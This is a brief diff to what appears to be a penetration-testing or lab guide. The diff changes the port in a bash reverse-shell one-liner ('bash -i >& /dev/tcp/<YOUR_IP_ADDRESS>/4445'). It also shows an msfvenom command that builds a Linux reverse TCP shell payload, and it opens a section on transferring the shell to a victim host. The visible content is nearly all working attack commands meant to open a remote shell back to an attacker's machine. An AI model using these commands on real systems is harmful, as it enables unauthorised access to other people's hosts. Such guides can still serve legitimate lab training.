@@ -13,7 +13,7 @@ msfvenom -p linux/x86/shell/reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f elf > shel
 Save it as shell.sh
 ```
 #!/bin/bash
-bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4445 0>&1
 ```
 
 ## Transfer the shell to the victim host
